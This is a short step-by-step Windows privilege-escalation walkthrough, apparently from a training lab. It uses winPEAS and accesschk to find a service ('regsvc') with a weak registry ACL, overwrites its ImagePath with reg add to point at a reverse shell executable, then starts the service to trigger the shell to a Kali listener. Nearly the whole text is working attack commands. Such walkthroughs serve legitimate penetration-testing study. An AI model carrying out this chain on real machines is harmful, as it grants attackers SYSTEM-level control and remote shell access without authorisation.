1.Run winPEAS to check for service misconfigurations:

> .\winPEASany.exe quiet servicesinfo


2.Note that the “regsvc” service has a weak registry entry. We can confirm this with PowerShell:


PS> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc |
Format-List

3.Alternatively accesschk.exe can be used to confirm:

.\accesschk.exe /accepteula -uvwqk

HKLM\System\CurrentControlSet\Services\regsvc

4.Overwrite the ImagePath registry key to point to our reverse shell executable:


reg add
HKLM\SYSTEM\CurrentControlSet\services\regsvc /v
ImagePath /t REG_EXPAND_SZ /d
C:\PrivEsc\reverse.exe /f


5.Start a listener on Kali, and then start the service to trigger the exploit:
> net start regsvc